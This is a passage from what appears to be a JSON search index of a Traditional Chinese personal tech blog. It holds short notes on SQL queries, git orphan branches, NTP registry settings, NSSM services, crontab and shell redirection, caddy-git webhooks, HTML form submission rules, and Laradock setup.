博客园](http://www.cnblogs.com/chiangchou/p/mysql-3.html)\n\n[sql 语法相关子查询与非相关子查询-流浪的野狼-ITPUB 博客](http://blog.itpub.net/28612416/viewspace-773763/)\n","tags":["非相關子查詢"],"categories":["SQL"]},{"title":"SQL判斷快否有小數點","url":"%2Fblog%2F2017%2F12%2F23%2Flogdown%2F2017-12-23-sql-judge-fast-no-decimal-point%2F","content":"今天要查詢商品價格有小數點的，爬一下Google\n有查到不錯方法，記錄一下\n\n<!--more-->\n\n\n```sql\nselect   col1,\ncase   col1   when  cast(col1  as int) then '不是' else '是' end\nfrom   表1\n```\n\n```sql\nselect   col1\nfrom   表1\nwhere col1 <> cast(col1 as int)\n```\n\n# 參考來源\n[邏輯生活: SQL 判斷值是否有小數點](http://wushinetlife.blogspot.com/2012/02/sql_3749.html)","tags":["sql"],"categories":["SQL"]},{"title":"git建立空分支","url":"%2Fblog%2F2017%2F12%2F23%2Flogdown%2F2017-12-23-git-establishes-an-empty-branch%2F","content":"今天看到git網路上寫的，發現它可以建立新空分支。\n因為不常使用，在此筆記XD\n\n```sh\ngit checkout --orphan gh-pages //建立一個沒有parent的branch，並移到該branch上\n```\n\n[建立自己的GitHub Project Pages | kpman | code](https://code.kpman.cc/2013/05/18/%E5%BB%BA%E7%AB%8B%E8%87%AA%E5%B7%B1%E7%9A%84github-project-pages/)\n[在GIT中创建一个空分支 - Min的专栏 - SegmentFault](https://segmentfault.com/a/1190000004931751)","tags":["branch"],"categories":["Git"]},{"title":"不同電腦時間同步方法之一(NTP 同步)","url":"%2Fblog%2F2017%2F12%2F23%2Flogdown%2F2017-12-23-one-of-the-different-computer-time-synchronization-methods-ntp-synchronization%2F","content":"最近做生理監測設定，組長發現廠商時間上傳時間跟HIS不太合理\n就是**測量時間**會大於**上傳時間**\n這怎麼那麼奇怪!!!但用想也知道是設備跟Server不同步\n這時候NTP就派上用場了\n終於用在實務上\n\n<!--more-->\n\n```reg 時間同步20s.reg\nWindows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DateTime\\Servers]\n@=\"0\"\n\"0\"=\"**IP**\"\n\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\W32Time\\TimeProviders\\NtpClient]\n\"DllName\"=hex(2):25,00,73,00,79,00,73,00,74,00,65,00,6d,00,72,00,6f,00,6f,00,\\\n  74,00,25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,77,\\\n  00,33,00,32,00,74,00,69,00,6d,00,65,00,2e,00,64,00,6c,00,6c,00,00,00\n\"Enabled\"=dword:00000001\n\"InputProvider\"=dword:00000001\n\"AllowNonstandardModeCombinations\"=dword:00000001\n\"CrossSiteSyncFlags\"=dword:00000002\n\"ResolvePeerBackoffMinutes\"=dword:0000000f\n\"ResolvePeerBackoffMaxTimes\"=dword:00000007\n\"CompatibilityFlags\"=dword:80000000\n\"EventLogFlags\"=dword:00000001\n\"LargeSampleSkew\"=dword:00000003\n\"SpecialPollInterval\"=dword:00000014\n\"SpecialPollTimeRemaining\"=hex(7):74,00,69,00,6d,00,65,00,2e,00,77,00,69,00,6e,\\\n  00,64,00,6f,00,77,00,73,00,2e,00,63,00,6f,00,6d,00,2c,00,37,00,64,00,37,00,\\\n  37,00,61,00,65,00,31,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\\\n  00,00,00,00,00,00,00\n```\n\n```reg  time60s.reg\nWindows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DateTime\\Servers]\n@=\"0\"\n\"0\"=\"**IP**\"\n\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\W32Time\\TimeProviders\\NtpClient]\n\"DllName\"=hex(2):25,00,73,00,79,00,73,00,74,00,65,00,6d,00,72,00,6f,00,6f,00,\\\n  74,00,25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,77,\\\n  00,33,00,32,00,74,00,69,00,6d,00,65,00,2e,00,64,00,6c,00,6c,00,00,00\n\"Enabled\"=dword:00000001\n\"InputProvider\"=dword:00000001\n\"AllowNonstandardModeCombinations\"=dword:00000001\n\"CrossSiteSyncFlags\"=dword:00000002\n\"ResolvePeerBackoffMinutes\"=dword:0000000f\n\"ResolvePeerBackoffMaxTimes\"=dword:00000007\n\"CompatibilityFlags\"=dword:80000000\n\"EventLogFlags\"=dword:00000001\n\"LargeSampleSkew\"=dword:00000003\n\"SpecialPollInterval\"=dword:0000003c\n\"SpecialPollTimeRemaining\"=hex(7):74,00,69,00,6d,00,65,00,2e,00,77,00,69,00,6e,\\\n  00,64,00,6f,00,77,00,73,00,2e,00,63,00,6f,00,6d,00,2c,00,37,00,64,00,37,00,\\\n  37,00,61,00,65,00,31,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\\\n  00,00,00,00,00,00,00\n\n```\n\n需要點登入檔案，重新開機才會生效。\n這次經驗讓我知道設定NTP是很重要的事情\n組長問我NTP時間一定會正確嗎？我後來網路查一下\nNTP運算會扣除網路傳輸部份，所以不會有兩台電腦時間不一樣問題\n\n* [The Will Will Web | 如何調整 Windows 作業系統的時間正確性 ( 終極指令版 )](https://blog.miniasp.com/post/2009/06/08/How-to-adjust-Time-using-Windows-Time-Service.aspx)\n* [XYZ的筆記本: windows 時間自動校正](http://xyz.cinc.biz/2015/04/windows-w32tm.html)","tags":["NTP"],"categories":["Linux"]},{"title":"不用寫程式也能做Window Service(NSSM)","url":"%2Fblog%2F2017%2F12%2F23%2Flogdown%2F2017-12-23-you-can-do-window-service-without-writing-a-program%2F","content":"最近常常執行chat server，需要常常自己開\n後來有時忘記開，怕之後有忘記開還有下面執行列多一個很討厭\n所以我上網找了一下Window Service有什麼方法可以做\n竟然看到不用寫程式，但前提是需要裝這個工具\n不多說，先來筆記\n\n<!--more-->\n\n#指令\n## 啟動服務\n```sh\n$ nssm start \"服務名稱\"\n```\n## 停止服務\n```sh\n$ nssm stop \"服務名稱\"\n```\n## 重啟服務\n```sh\n$ nssm restart \"服務名稱\"\n```\n\n## 刪除服務\n```sh\n$ nssm remove \"服務名稱\"\n```\n\n## 設定服務(中英文參照)\n\n| 頁籤        | 參數              | 說明                       |\n|-------------|-------------------|----------------------------|\n| Application | Path              | 執行應用程式的路徑和名稱。 |\n| Application | Startup Directory | 啟動資料夾。               |\n| Application | Arguments         | 應用程式參數。             |\n| I/O         | Output (stdout)   | 結果輸出檔案。             |\n| I/O         | Error (stderr)    | 錯誤輸出檔案。             |\n\n中間，有試著測試假如我撞到port，起動NSSM建立好的Server會如何??\n什麼?竟然還繼續Work!!!後來發現原來是NSSM會執行執行程式\n所以我關掉chat Server竟然還可以跑\nNSSM設定還可以設定很多東西\n\n\n# 參考來源：\n* [NSSM - the Non-Sucking Service Manager](https://nssm.cc/)\n* [Xian's 學習筆記: Nginx run as windows service](http://blog.developer.idv.tw/2016/08/nginx-run-as-windows-service.html)\n* [解決問題 Windows Service (1) | Leo Yeh's Blog](http://leoyeh.me:8080/2017/07/26/%E8%A7%A3%E6%B1%BA%E5%95%8F%E9%A1%8C-Windows-Service-1/)\n* [透過NSSM建立Windows Services | RiCo技術農場 - 點部落](https:/\n\n","tags":["NSSM"],"categories":["實用工具"]},{"title":"取得重覆資料最新SQL","url":"%2Fblog%2F2017%2F12%2F18%2Flogdown%2F2017-12-18-get-the-latest-sql-for-duplicate-data%2F","content":"在[Backend 台灣 (Backend Tw)](https://www.facebook.com/groups/616369245163622/permalink/1222070147926859/)看到\n如下\n```sql\nSELECT m1.*\nFROM messages m1 LEFT JOIN messages m2\n ON (m1.name = m2.name AND m1.id < m2.id)\nWHERE m2.id IS NULL;\n```\n這寫法很有趣XD\n\n> Triton Ho:\nGroup by是 O(n log n)\nLeft join 是O(n^2)\n\n>George Li Chino Lin :\n實際上我如果把資料降到10比左右, 這兩種query 的效能就沒有明顯差異～\nhttp://sqlfiddle.com/#!9/296a6a/1\nhttp://sqlfiddle.com/#!9/296a6a/2\n但是筆數拉到300左右就有明顯差異了～\n所以合理判斷資料量上升～ 效能差距會越明顯～\n資料更大的話基本上沒辦法用這平台了ＸＤ\n\n>Chino Lin:\n我自己用一個表約100萬筆來測試\n使用left join方式 跑到超過6分鐘沒等下去 ，\n但是用子查詢groupby 大約1秒就跑完\n後來改成4萬筆left join跑了2分15才跑完\n子查詢+groupby也是大約1秒就跑完\n我的是mysql5.6\n那我看還是用子查詢+groupby就好.......\n可能是5.0太舊不值得參考了\n\n```sql\nselect *\nfrom messages\nwhere Id in (select max(id) from messages group by Name)\n```\n\n# 補充\n可能是MySQL版本問題，正常應該要用Group by 效能會比較好，看到這種特別SQL滿好奇，但這不是最好的解法\n純心賞看看就好，更多東西去[Backend 台灣 (Backend Tw)](https://www.facebook.com/groups/616369245163622/permalink/1222070147926859/)裡面看看\n","tags":["sql"],"categories":["SQL"]},{"title":"寫測試程式用js-yaml對設定檔做簡查","url":"%2Fblog%2F2017%2F12%2F13%2Flogdown%2F2017-12-13-js-yaml-write-test-program-to-do-a-simple-check-on-configuration-files%2F","content":"因為要做動物機要做自動化\n載入yaml想檢查一些設定是不是有錯誤\n利用上一篇寫的[Exit Codes 程式回傳錯誤碼 « 進擊的程式新手](http://malagege.logdown.com/posts/4442432-exit-codes-program-return-error-code)\n在透過Bitbucket做設定\n今天進行還滿順利\n在此筆記\n\n<!--more-->\n\n```js\nyaml = require(\"js-yaml\");\nfs = require(\"fs\");\n\n// Get document, or throw exception on error\ntry {\n  var doc = yaml.safeLoad(fs.readFileSync('config.yml', 'utf8'));\n  //console.log(doc);\n} catch (e) {\n  console.log('沒法正常解析yaml');\n  console.error(e);\n  process.exit(1);\n}\n```\n\n\n```js\nyaml = require(\"js-yaml\");\nfs = require(\"fs\");\n\n// Get document, or throw exception on error\ntry {\n  var doc = yaml.safeLoad(fs.readFileSync('config.yml', 'utf8'));\n  //console.log(doc);\n} catch (e) {\n  console.log('沒法正常解析yaml');\n  console.error(e);\n  process.exit(1);\n}\n\ntry {\n    let default_path = doc.templates.default.transmission.path;\n    let olddownload_path = doc.templates.olddownload.transmission.path;\n    let autoPass_path = doc.templates.autoPass.transmission.path;\n    let default_month = default_path.substr(32, 2);\n    let olddownload_month = olddownload_path.substr(32, 2);\n    let autoPass_month = autoPass_path.substr(32, 2);\n\n    let now_month = new Date().getMonth();\n\n    let month_maping = {\n        '0' : '01',\n        '1' : '01',\n        '2' : '01',\n        '3' : '04',\n        '4' : '04',\n        '5' : '04',\n        '6' : '07',\n        '7' : '07',\n        '8' : '07',\n        '09' : '10',\n        '10' : '10',\n        '11' : '10',\n    };\n\n    if (month_maping[now_month] != default_month) throw \"config.yml裡default_path沒設定正確(\" + month_maping[now_month] +\")月份名稱\";\n    if (month_maping[now_month-3] != olddownload_month) throw \"config.yml裡olddownload_month沒設定正確(\" + month_maping[now_month] + \")月份名稱\";\n    if (month_maping[now_month-3] != autoPass_month) throw \"config.yml裡autoPass_month沒設定正確(\" + month_maping[now_month] + \")月份名稱\";\n\n} catch (error) {\n    console.error(error);\n    process.exit(1);\n}\n\n\nconsole.log('測試正常');\n```\n\n\n```yml,bitbucket-pipelines.yml\nimage: node:6.9.4\n\npipelines:\n  default:\n    - step:\n        script: # Modify the commands below to build your repository.\n          - npm install -g yaml-lint\n          - yamllint config.yml\n          - npm install\n          - npm test\n```\n\n\n```json,package.json\n{\n  \"name\": \"yaml_config\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"test.js\",\n  \"dependencies\": {\n    \"js-yaml\": \"^3.10.0\"\n  },\n  \"devDependencies\": {},\n  \"scripts\": {\n    \"test\": \"node test\"\n  },\n  \"repository\": {\n    \"type\": \"git\",\n    \"url\": \"git+https://malagege@bitbucket.org/malagege/yaml_config.git\"\n  },\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"homepage\": \"https://bitbucket.org/malagege/yaml_config#readme\"\n}\n```","tags":["測試"],"categories":["CI"]},{"title":"[Linux]切換使用者筆記","url":"%2Fblog%2F2017%2F12%2F13%2Flogdown%2F2017-12-13-linux-switch-user-notes%2F","content":"最近忘記這篇[Controb排程設定 « 進擊的程式新手](http://malagege.logdown.com/posts/2131881)之前下的指令要怎麼用\n所以記錄一下\n以免在次花一堆時間查詢\n```bash\n sudo -u debian-transmission crontab -e\n```\n\n<!--more-->\n\n```\n[root@study ~]# su [-lm] [-c 指令] [username]\n選項與參數：\n-   ：單純使用 - 如『 su - 』代表使用 login-shell 的變數檔案讀取方式來登入系統；\n      若使用者名稱沒有加上去，則代表切換為 root 的身份。\n-l  ：與 - 類似，但後面需要加欲切換的使用者帳號！也是 login-shell 的方式。\n-m  ：-m 與 -p 是一樣的，表示『使用目前的環境設定，而不讀取新使用者的設定檔』\n-c  ：僅進行一次指令，所以 -c 後面可以加上指令喔！\n```\n\n先`sudo -i`進入root權限，再下`su -m debian-transmission`指令就可以進去shell介面\n\n```\n[root@study ~]# sudo [-b] [-u 新使用者帳號]\n選項與參數：\n-b  ：將後續的指令放到背景中讓系統自行執行，而不與目前的 shell 產生影響\n-u  ：後面可以接欲切換的使用者，若無此項則代表切換身份為 root 。\n```\n\n**2019-10-24**\n\n## 切換使用者(帳號)方法\n\n> 先`sudo -i`進入root權限，再下`su -m debian-transmission`指令就可以進去shell介面\n\n除了這招，最近 docker 執行 cmd 的方法讓我想到一個方法`sudo -u debian-transmission bash`\n\n## newgrp, groups\n\n之前有紀錄 [Linux 利用 usermod 修改使用者的參數和資料 | 程式狂想筆記](https://malagege.github.io/blog/2014/09/15/logdown/2014-09-15-linux-use-usermod-to-modify-the-users-parameters-and-data/)\n但當時還菜~~現在也很菜~~\n沒有紀錄很完整\n\n例如剛剛安裝完 docker\n只能用 root 方法去執行\n如果想把一般 user 使用 docker 方法，就把 user 加到 docker 使用者\n\n```\nsudo usermod -G docker -a testuser\n```\n[[Docker] 使用非 root 權限來執行 docker client | EPH 的程式日記](https://ephrain.net/docker-%E4%BD%BF%E7%94%A8%E9%9D%9E-root-%E6%AC%8A%E9%99%90%E4%BE%86%E5%9F%B7%E8%A1%8C-docker-client/)\n例如這個\n\n要重開 bash 或 `newgrp docker`可以使用\n~~當年就是看太快，想說奇怪怎麼沒用~~\n\n詳細講一下 newgrp docker，其實我覺得他有點向開一個新 bash\n如果很難懂看下面應該很好懂\ngroups 第一個就是目前群組\n\n> newgrp 切換群組\n> 此為帳號和群組管理相關的指令, newgrp 指令類似 login 以相同的帳號登入另一個群組,以指令 exit 又回到原群組。\n> $ groups ←列出有那些有群組成員\n> frank marketing ←有效群組(effective group)目前為〝frank〞(列在前的為有效群組)\n> $ newgrp marketing ←登入〝marketing〞群組\n> $ groups ←驗證有無登入另一個群組\n> marketing frank ←有效群組變〝marketing〞了\n> $ exit ←回原群組\n> $ groups ←驗證看看\n> frank marketing \n> 參考 [阿旺的 Linux 開竅手冊 newgrp 指令](http://www.polish.url.tw/inst/newgrp.html)\n\n再看[Linux newgrp命令用法详解：切换用户的有效组](http://c.biancheng.net/view/860.html)圖 1 newgrp 切換初始組程序運行過程圖\n應該可以更清楚了解\n\n## 我想的管理帳號方法\n\nTransmission 會建立 debian-transmission 帳號。\nDocker 會建立 docker 帳號。\n\n所以一個應用程式獨立一個帳號\n然後利用加群組方式授權帳號\n可以算是一個管理模式\n這樣不用再注意777的問題\n\n參考來源:\n[鳥哥的 Linux 私房菜 -- 第十三章、Linux 帳號管理與 ACL 權限設定](http://linux.vbird.org/linux_basic/0410accountmanager.php#userswitch)\n[技术|chgrp 和 newgrp 命令简介](https://linux.cn/article-11399-1.html)\n","tags":["sudo"],"categories":["Linux"]},{"title":"Exit Codes 程式回傳錯誤碼","url":"%2Fblog%2F2017%2F12%2F12%2Flogdown%2F2017-12-12-exit-codes-program-return-error-code%2F","content":"看到上一篇[Crontab 執行特定目錄 « 進擊的程式新手](http://malagege.logdown.com/posts/4442412-crontab-execution-specific-directory)\n我就想想我寫的程式如何寫出err訊息\n然後在Bitbucket測試程式可以跑\n\n後來Google到[Exit Codes - Shell Scripting Tutorial](https://www.shellscript.sh/exitcodes.html)\n原來每一個程式語言有類似`System.exit(int i)`這個東西\n0表示程式正常，其他值表式程式有錯誤\n\n這時候zsh前面會有x表示\n\n[理解 Exit Code 並學會如何在 Bash 腳本中使用 - 壹讀](https://read01.com/zh-tw/dxO3gQ.html)\n[Exit Codes - Shell Scripting Tutorial](https://www.shellscript.sh/exitcodes.html)\n","tags":["system.exit"],"categories":["程式心法"]},{"title":"Crontab 執行特定目錄","url":"%2Fblog%2F2017%2F12%2F12%2Flogdown%2F2017-12-12-crontab-execution-specific-directory%2F","content":"```crontab -l\n50 * * * * cd /home/me/.flexget && sh /home/me/.flexget/gitpull.sh >/dev/null 2>&1\n```\n假如前面沒有做cd動作，執行目錄不會是在相同目錄\n在此筆記，以後就不用查了\n直接看筆記XD\n\n<!--more-->\n\n\n在鳥哥看到`12.2.2 script 的執行方式差異 (source, sh script, ./script)`\n相信可能跟這個也很有關係\n\n[摩托學園討論區 • 檢視主題 - [分享] 研究 2>&1 後的一點點心得](https://moto.debian.tw/viewtopic.php?f=11&t=17208)\n也看到`>/dev/null`執行正確不會東西，但是執行錯誤會顯示在console上面\n但是`2>&1`會把錯誤資訊鳥在/dev/null (前提看你前面寫什麼)\n詳細看裡面教學\n\n**2020-04-25**\n\n```bash\n# 輸出結果也不太一樣\nls  > dirlist  2>&1\nls 2>&1 > dirlist\n# 對於第二種情況，標準錯誤只是使用了標準輸出的文件表項，而標準輸出使用了 dirlist 的文件表項。\n```\n參考:[Bash中的IO與重定向 | 退思園](https://gowa.club/Linux-Unix/Bash%E4%B8%AD%E7%9A%84IO%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91.html)\n\n[What is the 'working directory' when cron executes a job? - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/38951/what-is-the-working-directory-when-cron-executes-a-job)\n[unix - Crontab - Run in directory - Stack Overflow](https://stackoverflow.com/questions/8899737/crontab-run-in-directory)\n[鳥哥的 Linux 私房菜 -- 第十二章、學習 Shell Scripts](http://linux.vbird.org/linux_basic/0340bashshell-scripts.php#some_ex_run)\n[摩托學園討論區 • 檢視主題 - [分享] 研究 2>&1 後的一點點心得](https://moto.debian.tw/viewtopic.php?f=11&t=17208)\n\n\n\n# crontab Jitter\n\n[APScheduler的使用详解_ITPUB博客](http://blog.itpub.net/69945560/viewspace-2670150/)\n\n```bash\n#!/bin/bash\n\nmaxdelay=$((14*60))  # 14 hours from 9am to 11pm, converted to minutes\nfor ((i=1; i<=20; i++)); do\n    delay=$(($RANDOM%maxdelay)) # pick an independent random delay for each of the 20 runs\n    (sleep $((delay*60)); /path/to/phpscript.php) & # background a subshell to wait, then run the php script\ndone\n```\n\n[bash - Cron jobs and random times, within given hours - Stack Overflow](https://stackoverflow.com/questions/9049460/cron-jobs-and-random-times-within-given-hours)\n\n[Avoid the \"top of the minute problem\" - space out your cronjobs - Ask Bjørn Hansen](https://www.askbjoernhansen.com/2007/11/19/space_out_cronjobs.html)\n\n\n[A little jitter can help (evening out distributed cron-based tasks) | Server Check.in](https://servercheck.in/blog/little-jitter-can-help-evening-out-distributed)\n\n[A little jitter can help (evening out distributed cron-based tasks) | Server Check.in](https://servercheck.in/blog/little-jitter-can-help-evening-out-distributed)","tags":["crontab"],"categories":["Linux"]},{"title":"用caddy-git使用webhook初體驗","url":"%2Fblog%2F2017%2F11%2F26%2Flogdown%2F2017-11-26-3865744%2F","content":"最近想自動化樹莓派同步git server上面的東西\n有找到要使用webhook\n目前樹莓派上面沒有啟用fastcgi東西\n上次有看到caddy他還有類似webhook這玩意\n就玩一下，筆記\n[abiosoft/caddy-git: git middleware for Caddy](https://github.com/abiosoft/caddy-git)\n<!--more-->\n\n首先就先用gitea來建立server測試\n執行caddy的時候\n會git pull動作\ncaddy-git文件寫預設1小時會git pull動作\n```\nlocalhost:80\ngit {\n\trepo     http://localhost:3000/root/test.git\n\tpath     C:/test/\n}\n```\n要設定多久要git pull 可以設定\n`interval        60`   是1分鐘`git pull`動作\n要加入webhook\n只要設定\n```\nlocalhost:80\ngit {\n    \trepo     http://localhost:3000/root/test.git\n    \tpath     C:/test/\n\t    #interval        60\n      hook /webhook test\n}\n```\n可以用`#`當注解\nhook設定也想當簡單\n`hook /webhook secret-password`\n\n當然gitea設定webhook也很簡單\n[img]https://i.imgur.com/5pFYK8Z.png[/img]\n這樣就搞定了\n\n\n這之後我也有找一些webhook工具\n但是都沒有看到apache相關webhook東西\n\n[NetEaseGame/git-webhook: 使用 Python Flask + SQLAchemy + Celery + Redis + React 开发的用于迅速搭建并使用 WebHook 进行自动化部署和运维，支持 Github / GitLab / Gogs / GitOsc。](https://github.com/NetEaseGame/git-webhook)\n[Webhook 实践 —— 自动部署 | 咀嚼之味](http://jerryzou.com/posts/webhook-practice/)\n[Raspberry Pi Raspbian Jessie 安裝設定 – 靠der Cowder – Medium](https://medium.com/cowbear-coder/raspberry-pi-raspbian-jessie-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A-15599a6785e9)\n\n原本想試試[rvagg/github-webhook-handler: Node.js web handler / middleware for processing GitHub Webhooks](https://github.com/rvagg/github-webhook-handler)\n不過對systemd還不是很熟\n不知道要怎麼設定\n\n最後，我覺得直接crontab設定1小時做git pull動作\n因為我的需求也不需要很及時做更新\n\n這應該就能解決我的需求\n待下次作筆記\n* [孤島日誌: Unix 重新導向跟 2>&1](http://ibookmen.blogspot.com/2010/11/unix-2.html)\n* [“> /dev/null 2>&1” 的意思 – Linux 技術手札](https://www.phpini.com/linux/dev-null-2-and-1-meanning)\n* [摩托學園討論區 • 檢視主題 - [分享] 研究 2>&1 後的一點點心得](https://moto.debian.tw/viewtopic.php?f=11&t=17208)\n","tags":["caddy-git"],"categories":["Git"]},{"title":"Caddy Web Server初次小體驗","url":"%2Fblog%2F2017%2F11%2F26%2Flogdown%2F2017-11-26-caddy-first-small-experience%2F","content":"這是簡單caddy架設筆記\n在FB上看到有人推這個\n會自動建立 Let's Encrypt 憑證\n不需要設定\n就很好奇玩了一下\n\n<!--more-->\n\n在沒有設定Caddyfile\nport預設為2015\n支援日文、簡體中文、韓文檔案下載\n哈，不知道能不能當hfs\n\n\n在同目錄新增`Caddyfile`\n官網文件[The Caddyfile Syntax](https://caddyserver.com/docs/caddyfile#lexical-syntax)\n設定感覺不難\n\n\n\n內容如下\n```\nlocalhost:80\nroot .\ngzip\nlog\nbrowse\n```\n\nbrowse可幾乎同等於autoindex，可惜沒有預設設定排序\n不過會記憶選擇後的排序\n\n\n可以指定`Caddyfile`目錄\n`caddy -conf C:\\Users\\xxx\\Desktop\\caddy\\Caddyfile`\n\n短時間不知道能不能取代我的apache\n不過目前懶的做更換\n\n還發現有caddy-git這個東西\n改天做研究","tags":["web server"],"categories":["Linux"]},{"title":"Form 送出可能沒注意到的事情(select地雷)","url":"%2Fblog%2F2017%2F11%2F25%2Flogdown%2F2017-11-25-form-forms-send-out-things-that-might-not-have-been-noticed-select-mines%2F","content":"因為最近程式需要從IE8到IE11相容易改版\n今天同事問我他跟我說他最近網路遇到的怪事\nIE8做submit可以接收到多個select資料\n但是IE11確不行....\n後來發現這真的不是很多人知道的東西\n做一下筆記\n<!--more-->\n\n#select 地雷\n\n##value設定沒有options裡面的值\n\n當設定select.value='ffff'，但是select沒有內容，select將會為\"\"空字串\n```\nThe value IDL attribute, on getting, must return the value of the first option element in the list of options in tree order that has its selectedness set to true, if any. If there isn't one, then it must return the empty string.\n```\n[HTML Standard](https://html.spec.whatwg.org/multipage/form-elements.html#dom-select-value)\n\n##select設定沒有內容值，submit不會送出去\n**如上面的「value設定沒有options裡面的值」**\n不會送出去\n可參考第5點\n```\nIf the field element is a select element, then for each option element in the select element's list of options whose selectedness is true and that is not disabled, append an entry to the form data set with the name as the name, the value of the option element as the value, and type as the type.\n```\n[HTML Standard](https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#concept-form-submit)\n\n\n##option沒設定value，預設value為text名稱\n\n```html\n<select>\n    <option>test</option>\n</select>\n```\n上面沒有設定value預設會以text內容為主(上面option value為test)\n\n```\nThe value attribute provides a value for element. The value of an option element is the value of the value content attribute, if there is one, or, if there is not, the value of the element's text IDL attribute.\n```\n[HTML Standard](https://html.spec.whatwg.org/multipage/form-elements.html#dom-option-value)\n\n\n## checkbox radio 地雷\n打勾(v)確沒有設定value值，value預設傳on\n```\nOtherwise, if the field element is an input element whose type attribute is in the Checkbox state or the Radio Button state, then:\n    If the field element has a value attribute specified, then let value be the value of that attribute; otherwise, let value be the string \"on\".\n    Append an entry to the form data set with name as the name, value as the value, and type as the type.\n```\n\n當沒選擇檔案submit情況\n```\nOtherwise, if the field element is an input element whose type attribute is in the File Upload state, then for each file selected in the input element, append an entry to the form data set with the name as the name, the file (consisting of the name, the type, and the body) as the value, and type as the type. If there are no selected files, then append an entry to the form data set with the name as the name, the empty string as the value, and application/octet-stream as the type.\n```\n\n\n這有遇到過，但也沒找到相關文件\n原來文件有寫這個\n\n#結論\nIE8可以跑多個select原因\n是因為IE8 bug關係\n\nIE11就照原本W3C文件規範XD\n這次真的了解很多東西\n","tags":["Form"],"categories":["HTML"]},{"title":"[SQL]比較null不能用等於","url":"%2Fblog%2F2017%2F11%2F18%2Flogdown%2F2017-11-18-3523839%2F","content":"用is比較null，不能用=\n\n\n[Re: [SQL ] 是否避免null值 - 看板 Database - 批踢踢實業坊](https://www.ptt.cc/bbs/Database/M.1371619944.A.7BC.html)\n[Re: [SQL ] 是否避免null值 - 看板 Database - 批踢踢實業坊](https://www.ptt.cc/bbs/Database/M.1369235271.A.6B0.html)\n","tags":["sql"],"categories":["SQL"]},{"title":"laradock架設筆記","url":"%2Fblog%2F2017%2F11%2F18%2Flogdown%2F2017-11-18-3523831%2F","content":"\n試試用 Docker 來記記 laravel 筆記\n\n<!--more-->\n\n1. 建置 laravel 專案\n   composer 建立\n\n```sh\ncomposer global require \"laravel/installer\"\n```\n\n```sh\nlaravel new blog\n```\n\n或\n\n```sh\ncomposer create-project --prefer-dist laravel/laravel blog\n```\n\n沒有安裝 composer 可以直接 git clone 下來\n\n```sh\ngit clone http://github.com/laravel/laravel\n```\n\n2. 建立 laradock 在 laravel 目錄下面\n\n```sh\ngit submodule add https://github.com/Laradock/laradock.git\n```\n\n3. 在 laradocker 目錄下複製範例 example-env，命名為.env\n\n```\ncp env-example .env\n```\n\n4. 執行 docker\n\n```sh\ndocker-compose up -d nginx mysql\n```\n\n5. 設置 laravel 目錄，env 設定 (PS:這邊的 env 跟 docker env 不一樣，不要搞錯了)\n\n```\ndocker-compose exec workspace bash\n```\n\n```\n$ root@workspace:/var/www# composer install\n$ root@workspace:/var/www# cp .env.example .env\n$ root@workspace:/var/www# php artisan key:generate\n$ root@workspace:/var/www# exit\n$root@server:~/laravel/laradock# cd ..\n$root@server:~/laravel# sudo chmod -R 777 storage bootstrap/cache\n```\n\n6. 設定 laravel 裡的.env DB 設定\n\n```\nDB_DATABASE=default\nDB_USERNAME=default\nDB_PASSWORD=secret\n```\n\n請參照你的 laradocker DB 帳號、密碼去做設定\n127.0.0.1 請改成 mysql or mariadb (依照 DB 選譯)\n\n```\nMYSQL_DATABASE=default\nMYSQL_USER=default\nMYSQL_PASSWORD=secret\n```\n\n已經測試過在 play with docker 可以跑了\n\n2019-06-09\n使用 MySQL 8.0 由於登入 caching_sha2_password\n[unable to connect to MySQL after upgrade to latest (8) version · Issue #2043 · laradock/laradock](https://github.com/laradock/laradock/issues/2043)\n[Documentation - Laradock](https://laradock.io/documentation/#change-the-mysql-version)\n[SQLSTATE[HY000] [2054] The server requested authentication method unknown to the client · Issue #1392 · laradock/laradock](https://github.com/laradock/laradock/issues/1392#issuecomment-383631421)\n\n假如 DB 沒限制的話，我推薦改使用 mariaDB\n快速解決\n\n參考來源\nhttps://laravel.tw/docs/5.3/installation\nhttp://laradock.io/guides/#set-up-your-laravel-project\n不專業網管筆記: [ 練習] 使用 Laradock 建立 Laravel 開發環境 (舊版說明)\nt301000.blogspot.com/2017/01/laradock-laravel.html\n[laradock 数据库连接问题 | Laravel China 社区](https://learnku.com/articles/5893/laradock-database-connection-problem)\n[Laradock — Laravel + Docker 輕量級環境打造 – Yifan Wu – Medium](https://medium.com/@yfancc20/laradock-%E8%BC%95%E9%87%8F-laravel-%E7%92%B0%E5%A2%83%E7%9A%84%E5%98%97%E8%A9%A6-%E5%B8%B8%E8%A6%8B%E9%8C%AF%E8%AA%A4-2fc6f0c21433)\n","tags":["Laravel"],"categories":["Laravel"]},{"title":"wagon架設筆記","url":"%2Fblog%2F2017%2F11%2F18%2Flogdown%2F2017-11-18-3523814%2F","content":"試著用wagon架設laravel\n先做一下筆記....\n\n<!--more-->\n\n\n[Releases · laravel-dojo/wagon](https://github.com/laravel-dojo/wagon/releases)下載解壓縮\n\n1. 執行`/wagon/uwamp/UwAmp.exe`\n\n```\n    Apache 已啟用 rewrite module、Document Root 設定在 wagon\\uwamp\\www\\default、port 改設定為 8000\n    MySQL port 改設定為 33060，可用 root/root 登入\n    adminer 位置為 http://localhost:8000/adminer\n```\n\n2. 想使用內建Laravel-demo範例，可參考www/demo1\n點擊 apache config 更改 wagon:8000裡的 Document Root: `{DOCUMENTPATH}/demo1/public`\n\n3. 調整laravel env 